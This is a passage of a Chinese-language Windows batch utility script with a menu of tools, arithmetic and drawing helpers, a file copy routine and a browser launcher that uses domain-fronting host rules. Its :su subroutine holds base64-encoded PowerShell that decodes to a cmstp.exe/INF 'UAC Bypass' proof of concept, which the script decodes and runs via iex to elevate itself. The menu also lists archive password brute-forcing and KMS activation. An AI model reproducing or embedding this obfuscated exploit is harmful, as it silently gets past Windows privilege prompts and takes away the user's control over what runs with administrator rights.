set "a40=获取文件权限"
set "a41=显示开机启动项"
set "a42=语音阅读器"
set "a43=批处理文件风险分析"
set "a44=文件搜索"
set "a45=修复已损坏的文件"
set "a46=暴力破解压缩包密码"
set "a47=Wifi热点"
set "a48=反编译chm文件"
set "a49=关闭无响应进程"
set "a50=文件比较器"
set "a51=将文字写入剪切板"
set "a52=打开系统服务设置"
set "a53=已知年月日计算星期"
set "a54=查询系统激活状态"
set "a55=创建指定文件的快捷方式到桌面"
set "a56=打开系统配置"
set "a57=字数统计"
set "a58=创建符号链接"
set "a59=打开管理控制台"
set "a60=解除Streams文件锁定"
set "a61=创建、删除或列出卷装入点"
set "a62=注册表搜索"
set "a63=Base64编解码"
set "a64=8.3短文件名管理"
set "a65=智能NTFS压缩"
set "a66=计算文件哈希值"
set "a67=显示货币汇率"
set "a68=创建虚拟盘符"
set "a69=解压msi安装文件"
set "a70=生成CMD控制台色彩表"
set "a71=KMS激活Windows"
set "a72=curl多进程下载"
set "a73=用域前置参数开启Chromium类浏览器"
set "a74=逐一复制文件并压缩"
set "a75=打开证书管理单元"
set "a76=BAT文本混淆"
set "a77=VBS计算器"
set maxa=77
)
goto :eof
:colortxt
setlocal
if "!winv!" equ "0" (goto colortxt2)
set "bj=%1"
if "!bj:~1,1!" equ "" (
	set "bj1=!color!"
	set "bj2=!bj!"
) else (
	set "bj1=!bj:~0,1!"
	set "bj2=!bj:~1,1!"
)
pushd "%temp%"
set /p =!cswz1!<nul>"%2"
findstr /v /a:!bj1!!bj2! /r "^$" "%2" nul
del /f "%2">nul 2>nul
popd
goto :eof
:colortxt2
set "bj=%1"
set "zt=%2"
if "!bj:~0,1!" equ "0" set bj1=40;
if "!bj:~0,1!" equ "4" set bj1=41;
if "!bj:~0,1!" equ "2" set bj1=42;
if "!bj:~0,1!" equ "6" set bj1=43;
if "!bj:~0,1!" equ "1" set bj1=44;
if "!bj:~0,1!" equ "5" set bj1=45;
if "!bj:~0,1!" equ "3" set bj1=46;
if "!bj:~0,1!" equ "7" set bj1=47;
if "!bj:~0,1!" equ "8" set bj2=90m
if "!bj:~0,1!" equ "c" set bj2=91m
if "!bj:~0,1!" equ "a" set bj2=92m
if "!bj:~0,1!" equ "e" set bj2=93m
if "!bj:~0,1!" equ "9" set bj2=94m
if "!bj:~0,1!" equ "d" set bj2=95m
if "!bj:~0,1!" equ "b" set bj2=96m
if "!bj:~0,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "8" set bj2=90m
if "!bj:~1,1!" equ "c" set bj2=91m
if "!bj:~1,1!" equ "a" set bj2=92m
if "!bj:~1,1!" equ "e" set bj2=93m
if "!bj:~1,1!" equ "9" set bj2=94m
if "!bj:~1,1!" equ "d" set bj2=95m
if "!bj:~1,1!" equ "b" set bj2=96m
if "!bj:~1,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "" set "bj1=!ysbak:~0,3!"
set /p =!cswz!!bj1!!bj2!!zt!!cswz!!ysbak!<nul
goto :eof
:rgb
setlocal
set "brgb=%1"
set "qrgb=%2"
set "zt=%3"
set "brgb=!brgb:.=;!"
set "qrgb=!qrgb:.=;!"
set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
goto :eof
:su
(
echo;IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K
echo;IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206
echo;IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K
echo;IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k
echo;bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g
echo;aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD
echo;bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh
echo;Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM
echo;b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy
echo;KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh
echo;IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4
echo;ZWN1dGUgPSAn
)>%temp%\1.base
(
echo;Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9
echo;YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd
echo;DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN
echo;ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N
echo;Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl
echo;IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv
echo;bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1
echo;c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf
echo;TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs
echo;ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg
echo;UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4
echo;cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y
echo;cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl
echo;bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K
echo;fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld
echo;DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
echo;ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp
echo;XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K
echo;ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg
echo;IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz
echo;cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w
echo;ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg
echo;DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg
echo;fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy
echo;b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg
echo;fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt
echo;UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB
echo;Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog
echo;ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp
echo;bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K
echo;ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K
echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl
echo;cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K
echo;ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl
echo;KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93
echo;KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp
echo;bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz
echo;ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg
echo;U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu
echo;ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg
echo;U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B
echo;cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B
echo;cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg
echo;IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk
echo;aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg
echo;PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h
echo;bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G
echo;RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h
echo;bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM
echo;b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5
echo;c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5
echo;c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl
echo;TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy
echo;dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K
echo;DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg
echo;d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg
echo;LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj
echo;bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y
echo;bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9
)>%temp%\2.base
set /p =%comspec% /c %0 -ks<nul>%temp%\su.bat
set /p =%temp%\su.bat<nul>%temp%\su.txt
certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypassps1">nul
powershell -mta -nologo -noprofile -command "$command=[IO.File]::ReadAllText('"%temp%\bypassps1"'); iex ($command[1])"
if exist "!systemroot!\system32\timeout.exe" (
	timeout /t 2 /nobreak>nul
) else (
	ping /n 2 0.0>nul
)
del %temp%\su.txt;%temp%\1.base;%temp%\2.base;%temp%\1.txt;%temp%\2.txt;%temp%\bypass.ps1;%temp%\su.bat
exit 0
:xdwjs
setlocal
set Bytes=%~1
set danwei=%~2
if /i "!danwei!" equ "kb" (set /a bytes*=1024)
if /i "!danwei!" equ "mb" (set /a bytes*=1048576)
if /i "!danwei!" equ "gb" (set /a bytes*=1073741824)
if "%~3" equ "" Goto :eof
call :Division !Bytes! 1152921504606846976 2 OK
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% EB
	Goto :eof
) else (call :Division !Bytes! 1125899906842624 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% PB
	Goto :eof
) else (call :Division !Bytes! 1099511627776 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% TB
	Goto :eof
) else (call :Division !Bytes! 1073741824 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% GB
	Goto :eof
) else (call :Division !Bytes! 1048576 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% MB
	Goto :eof
) else (call :Division !Bytes! 1024 2 OK)
if not "%OK:~0,2%" equ "0." (
	endlocal&set %~3=%OK% KB
	Goto :eof
) else (
	endlocal&set %~3=%Bytes% Byte
	Goto :eof
)
:Division
setlocal
if "%~4" equ "" Goto :eof
set Div.1=%~1
set Div.2=%~2
set Div.3=
set Div.I=0
set Div.D=%~3
set Div.1.Len.0=
set Div.2.Len.0=
set Div.Z=00000000
for /l %%i in (1 1 9) do set Div.Num.%%i=
for /l %%i in (1 1 7) do set Div.Z=!Div.Z!!Div.Z!
set Div.H=4096 2048 1024 512 256 128 64 32 16 8 4 2 1
for /l %%i in (1 1 2) do (
	set Div.N=0
	set Div.%%i.Len.2=0
	for %%j in (!Div.%%i:.^= !) do (
		set /a Div.N+=1
		set Div.M=Div.M%%j
		set Div.%%i.Len.!Div.N!=0
		for %%l in (!Div.H!) do (
			if "!Div.M:~%%l!" neq "" (
				set /a Div.%%i.Len.!Div.N!+=%%l
				set Div.M=!Div.M:~%%l!
			)
		)
		set /a Div.%%i.Len.0+=Div.%%i.Len.!Div.N!
	)
        set Div.%%i=!Div.%%i:.=!
)
if !Div.1.Len.2! gtr !Div.2.Len.2! (
	set /a Div.2.Len.0+=Div.1.Len.2-Div.2.Len.2
	) else (
		set /a Div.1.Len.0+=Div.2.Len.2-Div.1.Len.2
)
for /l %%i in (1 1 2) do (
	set Div.%%i=!Div.%%i!!Div.Z!
	for %%j in (!Div.%%i.Len.0!) do set Div.%%i=!Div.%%i:~,%%j!
)
for /f "tokens=* delims=0" %%i in ("!Div.2!") do (
	set Div.O=%%i
	set Div.2=0%%i
)
set Div.2.Len.0=1
for %%i in (!Div.H!) do (
	if "!Div.O:~%%i!" neq "" (
		set /a Div.2.Len.0+=%%i
		set Div.O=!Div.O:~%%i!
	)
)
set /a Div.Len=Div.2.Len.0+1
if !Div.1.Len.0! lss !Div.2.Len.0! (
	set Div.1.Len.0=!Div.2.Len.0!
	set Div.1=!Div.Z:~-%Div.2.Len.0%,-%Div.1.Len.0%!!Div.1!
)
set /a Div.1.Len.0+=Div.D
set Div.1=0!Div.1!!Div.Z:~,%Div.D%!
set Div.P=!Div.1:~,%Div.2.Len.0%!
set Div.T=0000000!Div.2!
set /a Div.J+=1
set /a Div.Tem.Len=Div.2.Len.0+7
if !Div.J! equ 1 (for %%i in (!1:~-1!) do (
	for /f "delims=" %%j in ("!%%i!") do (
		if %%~Zj equ !%Div.I%! set C=!Div.D!
		)
	)
)
for /l %%i in (1 1 9) do (
	set Div.V=0
	for /l %%j in (8 8 !Div.Tem.Len!) do (
		set /a Div.V=1!Div.T:~-%%j,8!*%%i+Div.V
        	set Div.Num.%%i=!Div.V:~-8!!Div.Num.%%i!
		set /a Div.V=!Div.V:~,-8!-%%i
	)
	set Div.Num.%%i=!Div.V!!Div.Num.%%i!
	set Div.Num.%%i=0000000!Div.Num.%%i:~-%Div.Len%!
)
for /l %%l in (!Div.2.Len.0! 1 !Div.1.Len.0!) do (
	set Div.P=!Div.Z!!Div.P!!Div.1:~%%l,1!
	set Div.P=!Div.P:~-%Div.Len%!
	if !Div.J! equ 1 (
		set Div.I.Tem=
		for %%i in (!%Div.I%!) do set Div.D.Tem=%%i
		for /l %%i in (0 1 9) do set Div.D.Tem=!Div.D.Tem:%%i=%%i !
		for %%i in (!Div.D.Tem!) do set /a Div.I.Tem=!Div.I.Tem!+%%i
		if !Div.I.Tem! neq 24 set C=
	)
	if "!Div.P!" geq "!Div.2!" (
		set Div.R=1
		set Div.S=0000000!Div.P!
		for /l %%i in (2 1 9) do (
			if "!Div.S!" geq "!Div.Num.%%i!" set Div.R=%%i
		)
		set Div.3=!Div.3!!Div.R!
		set Div.P=
		set Div.V=0
		for %%i in (!Div.R!) do (
			for /l %%j in (8 8 !Div.Tem.Len!) do (
				set /a Div.V=3!Div.S:~-%%j,8!-1!Div.Num.%%i:~-%%j,8!-!Div.V:~,1!%%2
				set Div.P=!Div.V:~1!!Div.P!
			)
		)	
	) else set Div.3=!Div.3!0
)
if defined Div.D if %Div.D% gtr 0 set Div.3=!Div.3:~,-%Div.D%!.!Div.3:~-%Div.D%!
for /f "tokens=* delims=0" %%i in ("!Div.3!") do set Div.3=%%i
if "!Div.3:~0,1!" equ "." set Div.3=0!Div.3!
if "!Div.3!" equ "" set Div.3=0
endlocal&set %~4=%Div.3%
goto :eof
:cf
setlocal
call :cf_1 %1 %2 %3 jg
endlocal&set %4=%jg%
goto :eof
:cf_1
set num=0
set dec_str=
set input=
if "%~4" equ "" (goto :eof)
set /a int_str=%1/%2
set /a mod=%1%%%2
if %mod% equ 0 goto end
:count_dec
set mod=%mod%0
if %mod% lss %2 (
    set dec_str=!dec_str!0
    goto count_dec
) else (
    set /a dec=%mod%/%2
    set dec_str=!dec_str!!dec!
    set /a mod=%mod%%%%2
)
set /a num+=1
if %mod% neq 0 if %num% lss %3 goto count_dec
:end
for /l %%i in (1,1,%3) do set zero_str=!zero_str!0
set dec_str=%dec_str%%zero_str%
set %~4=%int_str%.!dec_str:~0,%3!
goto :eof
:add
setlocal
(set L=&for /l %%a in (1,1,8) do set L=!L!00000000
for /f "tokens=1-3 delims=." %%a in ("!L!%1.!L!") do set at=%%a&set aw=%%b%%c
for /f "tokens=1-3 delims=." %%a in ("!L!%2.!L!") do set bt=%%a&set bw=%%b%%c
set a=!at:~-64!!aw:~,64!&set b=!bt:~-64!!bw:~,64!&set e=&set v=200000000
for /l %%a in (8,8,128)do set/a v=1!b:~-%%a,8!+1!a:~-%%a,8!+!v:~-9,-8!-2&set e=!v:~-8!!e!
set e=!e:0= !&for /f "tokens=*" %%a in ("!e:~,-64!_.!e:~64!") do set e=%%~nxa
set e=!e:_=!&for %%a in ("!e: =0!") do endlocal&(if %3.==. (echo;%%~a) else set %3=%%~a)
goto :eof)
:offdisplay
powershell (Add-Type '[DllImport(\"user32.dll\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
goto :eof
:choice
setlocal
choice /c !cho! /n /m "输入选项: "
endlocal&set "shuru=%errorlevel%"
goto :eof
:set
setlocal
set shurux=
set /p "shurux=输入选项: "
endlocal&set "shuru=%shurux%"
goto :eof
:bk
setlocal
set cs=0
for /f "delims=: skip=2 tokens=2" %%a in ('"mode con"') do (
	set /a "cs+=1"
	if "!cs!" equ "1" (set "h=%%a")
	if "!cs!" equ "2" (set "l=%%a")
)
set /a "h_1=h-1"
set /a "l_1=l-1"
set /a "l_4=l-4"
for /l %%a in (0,1,!l_4!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!1;1H!fh!<nul
for /l %%a in (2,1,!h_1!) do (
	set /p =!cswz!%%a;1H^|!cswz!%%a;!l_1!H^|<nul
)
set /p =!cswz!!h_1!;1H!fh!<nul
goto :eof
:fk
setlocal
set "h=%1"
set "l=%2"
set /a "h1=h+1"
set /a "l1=%4-2"
set /a "h2=h+%3-2"
set /a "l2=l+%4-1"
set /a "h3=h+%3-1"
for /l %%a in (1,1,!l1!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!!h!;!l!H!fh!<nul
for /l %%a in (!h1!,1,!h2!) do (
	set /p =!cswz!%%a;!l!H^|!cswz!%%a;!l2!H^|<nul
)
set /p =!cswz!!h3!;!l!H!fh!<nul
goto :eof
:hx
setlocal
set "h=%1"
set "l=%2"
set /a "cd=%3-2"
for /l %%a in (1,1,!cd!) do (
	set "fh=!fh!-"
)
set "fh=+!fh!+"
set /p =!cswz!!h!;!l!H!fh!<nul
goto :eof
:sx
setlocal
set "h=%1"
set "l=%2"
set /a "h1=h+1"
set /a "h2=h+%3-1"
set /a "cd=%3+h-2"
set /p =!cswz!!h!;!l!H+<nul
for /l %%a in (!h1!,1,!cd!) do (
	set /p =!cswz!%%a;!l!H^|<nul
)
set /p =!cswz!!h2!;!l!H+<nul
goto :eof
:73
setlocal
:chrome
@echo off&setlocal enabledelayedexpansion&chcp 936>nul
set "域名重定向=!temp!\域名重定向.txt"
set "域名重解析=!temp!\域名重解析.txt"
set "强制使用quic=!temp!\强制使用quic.txt"
if not exist "!域名重定向!" (
	(
		echo #wikipedia
		echo *.wikipedia.org=wikidata.org
		echo *.wikiquote.org=wikidata.org
		echo *.wikinews.org=wikidata.org
		echo *.wikibooks.org=wikidata.org
		echo *.wiktionary.org=wikidata.org
		echo *.wikisource.org=wikidata.org
		echo *.wikivoyage.org=wikidata.org
		echo *.wikiversity.org=wikidata.org
		echo;
		echo #pixiv
		echo pixiv.net=pixiv.me
		echo *.pixiv.net=pixiv.me
		echo *.pximg.net=pximg.net
		echo;
		echo #protonmail
		echo proton.me=pr.tn
		echo account.proton.me=a.pr.tn
		echo account-api.proton.me=b.pr.tn
		echo mail.proton.me=c.pr.tn
		echo;
		echo #youtube
		echo *.youtube.com=google-analytics.com
		echo *.ytimg.com=googleadservices.com
		echo *.ggpht.com=static.doubleclick.net
		echo youtube.com=static.doubleclick.net
		echo youtu.be=mt7.gstatic.com
		echo;
		echo #google
		echo *.google.com=googleadservices.com
		echo *.google.com.hk=googleadservices.com
		echo *.google.com.tw=googleadservices.com
		echo *.googleapis.com=static.doubleclick.net
		echo *.googleusercontent.com=static.doubleclick.net
		echo *.gstatic.com=alt6.gstatic.com
		echo *.cloudfunctions.net=alt6.gstatic.com
		echo *.blogspot.com=google-analytics.com
		echo;
		echo #github
		echo github.com=octocaptcha.com
		echo *.github.com=octocaptcha.com
		echo raw.githubusercontent.com=avatars.githubusercontent.com
		echo *.github.io=octocaptcha.com
		echo github.io=octocaptcha.com
		echo;
		echo #steam
		echo login.steampowered.com=login.steampowered.com
		echo help.steampowered.com=help.steampowered.com
		echo *.steampowered.com=steamuserimages-a.akamaihd.net
		echo steamcommunity.com=underlords.com
		echo *.steamcommunity.com=underlords.com
		echo;
		echo #onedrive
		echo onedrive.live.com=od0.live.com
		echo skyapi.onedrive.live.com=storage.live.com
		echo;
		echo #nyaa
		echo nyaa.si=nyaa.ddos-guard.net
		echo;
		echo #vercel.app
		echo vercel.app=no-sni.vercel-infra.com
		echo *.vercel.app=no-sni.vercel-infra.com
		echo;
		echo #lain.la
		echo *.lain.la=lain.la
		echo;
		echo pkuanvil.com=gcore.com
		echo *.pkuanvil.com=gcore.com
		echo;
		echo #quora
		echo quora.com=qr.ae
		echo *.quora.com=qr.ae
	)>"!域名重定向!"
)
if not exist "!域名重解析!" (
	(
		echo #wikipedia
		echo #wikidata.org=[2620:0:863:ed1a::1]
		echo wikidata.org=208.80.153.224
		echo;
		echo #protonmail
		echo pr.tn=proton.me
		echo a.pr.tn=account.proton.me
		echo b.pr.tn=account-api.proton.me
		echo c.pr.tn=mail.proton.me
		echo;
		echo #youtube google
		echo #mt7.gstatic.com=[2404:6800:4008:c07::5a]
		echo mt7.gstatic.com=39.106.25.252
		echo #alt6.gstatic.com=[2404:6800:4008:c07::5a]
		echo alt6.gstatic.com=39.106.25.252
		echo #google-analytics.com=[2404:6800:4008:c07::5a]
		echo google-analytics.com=39.106.25.252
		echo #googleadservices.com=[2404:6800:4008:c07::5a]
		echo googleadservices.com=39.106.25.252
		echo #static.doubleclick.net=[2404:6800:4008:c07::5a]
		echo static.doubleclick.net=39.106.25.252
		echo;
		echo #nyaa
		echo nyaa.ddos-guard.net=nyaa.si
	)>"!域名重解析!"
)
if not exist "!强制使用quic!" (
	(
		echo #不支持通配符
		echo www.google.com.hk
		echo www.google.com.tw
		echo www.google.com
		echo www.quora.com
		echo quora.com
		echo qsbr.cf2.quoracdn.net
		echo v2ex.com
		echo cdn.v2ex.com
		echo www.v2ex.com
		echo challenges.cloudflare.com
		echo www.openstreetmap.org
		echo tile.openstreetmap.org
		echo ipfs.io
		echo cloudflare-ipfs.com
	)>"!强制使用quic!"
)
cd /d "%~dp0"
rem 忽略证书错误 0=禁用 1=启用
set "pass_cert_error=0"
rem 生成chrome-command-line文件 0=禁用 1=启用
set "chrome-command-line=0"
rem 设置支持chrome命令行的浏览器的路径
set "chromium="C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""
if "!pass_cert_error!" equ "1" (
	set "ignore-certificate-errors=--ignore-certificate-errors"
)
if exist "chrome.exe" (
	set chrome=chrome.exe
	goto startchrome
) else (
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe" /v Path 2>nul"') do (
		set "chrome=%%a"
	)
	for /f "delims=" %%a in ("!chrome!") do (
		set "chrome=%%~fa"
	)
	if exist "!chrome!\Chrome.exe" (
		set "chrome=!chrome!\Chrome.exe"
		goto startchrome
	) else (
		for /f "delims=" %%a in ("!chromium!") do (
			set "chrome=%%~fa"
		)
		if exist "!chrome!" (
			goto startchrome
		) else (
			if "%1" neq "-chrome" (
				echo;没有找到浏览器路径
				call :out 2
				endlocal
				goto memuv2
			) else (
				msg %username% 没有找到浏览器路径
				exit 0
			)
		)
	)
)
:startchrome
for /f "delims=" %%a in ("!chrome!") do (
	tasklist /fi "IMAGENAME eq %%~nxa"|findstr /i /c:"%%~nxa">nul
	if "!errorlevel!" equ "0" (
		cls
		echo;%%~nxa正在运行,请关闭浏览器后重试.
		set /p =按任意键退出<nul&pause>nul
		if "%1" neq "-chrome" (
			endlocal
			goto memuv2
		) else (
			exit 0
		)
	)
)
if exist "!域名重定向!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!域名重定向!) do (
		set "host-rules=!host-rules!MAP %%a %%b, "
	)
	set "host-rules=--host-rules="!host-rules!""
)
if exist "!域名重解析!" (
	for /f "eol=# tokens=1,2 delims== " %%a in (!域名重解析!) do (
		set "host-resolver-rules=!host-resolver-rules!MAP %%a %%b, "
	)
	set "host-resolver-rules=--host-resolver-rules="!host-resolver-rules!""
)
if exist "!强制使用quic!" (
	for /f "eol=# tokens=1,2 delims=:" %%a in (!强制使用quic!) do (
		if "%%b" equ "" (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:443, "
		) else (
			set "origin-to-force-quic-on=!origin-to-force-quic-on!%%a:%%b, "
		)
	)
	set "origin-to-force-quic-on=--enable-quic --origin-to-force-quic-on="!origin-to-force-quic-on!""
)
if "!chrome-command-line!" equ "1" (
	set /p =chrome !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors!<nul>chrome-command-line
)
start /max "" "!chrome!" --profile-directory=Default --test-type !host-rules! !host-resolver-rules! !origin-to-force-quic-on! !ignore-certificate-errors! %2
if "%1" neq "-chrome" (endlocal&goto memuv2) else (exit 0)
:74
setlocal
title 逐一复制文件并压缩!system!
cls
rem 设置源目录和目标目录
set source_dir=
set target_dir=
set /p "source_dir=输入源目录: "
call :ljjc source_dir dir
if "!errorlevel!" equ "0" (
	set /p =无效输入<nul
	call :out 2
	endlocal
	goto 74
)
set /p "target_dir=输入目标目录: "
call :ljjc target_dir dir
if "!errorlevel!" equ "0" (
	set /p =无效输入<nul
	call :out 2
	endlocal
	goto 74
)
rem 创建目标目录结构
for /r "%source_dir%" %%f in (*) do (
	cls
    set "relative_path=%%~pf"
    set "relative_path=!relative_path:%source_dir%=!"
    set "target_path=!target_dir!!relative_path!"
    rem 创建目标子目录（如果不存在）
    if not exist "!target_path!" (mkdir "!target_path!")
    rem 拷贝文件到目标目录
	echo;"%%f" → "!target_path!%%~nxf"
    copy /y /z "%%f" "!target_path!%%~nxf"
    rem 压缩文件
    call :74_2 "!target_path!%%~nxf" %%~zf %%~xf
)
!hx!
set /p =按任意键返回菜单<nul&pause>nul
endlocal
goto memuv2
:74_2
if "%3" equ ".ogg" goto :eof
